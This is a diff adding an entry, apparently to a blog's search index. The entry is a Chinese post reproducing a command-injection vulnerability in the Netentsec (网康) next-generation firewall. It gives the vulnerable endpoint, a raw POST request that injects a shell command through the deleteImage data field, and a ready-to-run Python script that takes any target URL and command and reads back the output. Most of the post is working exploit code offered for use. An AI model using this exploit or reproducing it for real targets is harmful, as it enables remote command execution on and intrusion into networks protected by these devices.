@@ -31,6 +31,31 @@
     
     
     <entry>
+      <title>网康下一代防火墙   命令执行</title>
+      <link href="2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+      <url>2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建环境"><a href="#自行搭建环境" class="headerlink" title="自行搭建环境"></a>自行搭建环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B72.webp" alt="image"></p><h3 id="漏洞路径："><a href="#漏洞路径：" class="headerlink" title="漏洞路径："></a>漏洞路径：</h3><pre><code>/directdata/direct/router</code></pre><h3 id="数据包："><a href="#数据包：" class="headerlink" title="数据包："></a>数据包：</h3><pre><code>POST /directdata/direct/router HTTP/1.1Host: 192.168.1.86Connection: closeContent-Length: 160Upgrade-Insecure-Requests: 1&#123;&quot;action&quot;:&quot;SSLVPN_Resource&quot;,&quot;method&quot;:&quot;deleteImage&quot;,&quot;data&quot;:[&#123;&quot;data&quot;:[&quot;/var/www/html/d.txt;id &gt;/var/www/html/test.txt&quot;]&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:17,&quot;f8839p7rqtj&quot;:&quot;=&quot;&#125;</code></pre><h3 id="执行命令："><a href="#执行命令：" class="headerlink" title="执行命令："></a>执行命令：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B71.webp" alt="image"></p><h4 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B73.webp" alt="image"></p><h3 id="懒人："><a href="#懒人：" class="headerlink" title="懒人："></a>懒人：</h3><pre><code>import requestsrequests.packages.urllib3.disable_warnings()proxy = &#123;&#39;http&#39;: &#39;127.0.0.1:8080&#39;, &#39;https&#39;: &#39;127.0.0.1:8080&#39;&#125;def cmd(urllist,cmdsr):    url = urllist+&#39;/directdata/direct/router&#39;    data = &#123;&quot;action&quot;: &quot;SSLVPN_Resource&quot;, &quot;data&quot;: [&#123;&quot;data&quot;: [&quot;/var/www/html/d.txt;%s &gt;/var/www/html/test.txt&quot; % cmdsr]&#125;], &quot;f8839p7rqtj&quot;: &quot;=&quot;, &quot;method&quot;: &quot;deleteImage&quot;, &quot;tid&quot;: 17, &quot;type&quot;: &quot;rpc&quot;&#125;    cmdlist = requests.post(url=url,json=data,verify=False,proxies=proxy)    urlshow = urllist+&#39;/test.txt&#39;    cmdshow = requests.get(url=urlshow,verify=False,proxies=proxy)    print(cmdshow.text)if __name__ == &#39;__main__&#39;:    url = input(&#39;请输入url-格式为:https://xx.xx.xx.xx:\n&#39;)    cmdsr = input(&#39;输入需要执行的命令：\n&#39;)    cmd(url,cmdsr)</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B74.webp" alt="image"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>致远OA 组合getshell</title>
       <link href="2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/"/>
       <url>2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/</url>
